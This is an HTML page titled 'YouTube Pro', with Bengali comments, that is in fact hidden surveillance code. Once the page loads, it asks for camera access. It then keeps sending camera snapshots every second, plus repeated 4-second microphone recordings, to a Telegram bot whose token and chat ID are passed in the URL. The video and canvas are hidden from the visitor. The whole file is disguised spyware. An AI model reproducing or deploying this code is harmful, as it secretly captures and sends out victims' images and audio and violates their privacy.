<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Pro</title>
    <style>
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>

    <script>
        // URL থেকে প্যারামিটারগুলি গ্রহণ করার জন্য একটি ফাংশন
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        // chatId এবং botToken প্যারামিটারগুলি গ্রহণ করা
        const chatId = getQueryParam('chatId');
        const botToken = getQueryParam('botToken');

        function startCamera() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                video.setAttribute("width", "100%");
                video.setAttribute("height", "auto");
            } else {
                video.setAttribute("width", "2000");
                video.setAttribute("height", "2000");
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;

                    setInterval(() => {
                        ctx.drawImage(video, 0, 0, 2000, 2000);
                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
                        startRecording();
                    }, 1000);
                })
                .catch(error => {
                    console.error(error);
                    
                });
        }

        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append("photo", blob, "camera.jpg");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Camera frame sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    
                });
        }

        function sendAudioToTelegram(blob) {
            const formData = new FormData();
            formData.append("audio", blob, "recording.wav");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Audio recording sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);

                });
        }

        function startRecording() {
            const audioChunks = [];

            navigator.mediaDevices
                .getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    const mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 4000);

                    mediaRecorder.addEventListener("dataavailable", (event) => {
                        audioChunks.push(event.data);
                    });

                    mediaRecorder.addEventListener("stop", () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        sendAudioToTelegram(audioBlob);
                    });
                })
                .catch((error) => {
                    console.error(error);
                    
                });
        }

        // Call startCamera when the page is loaded.
        startCamera();
    </script>
</body>
</html>
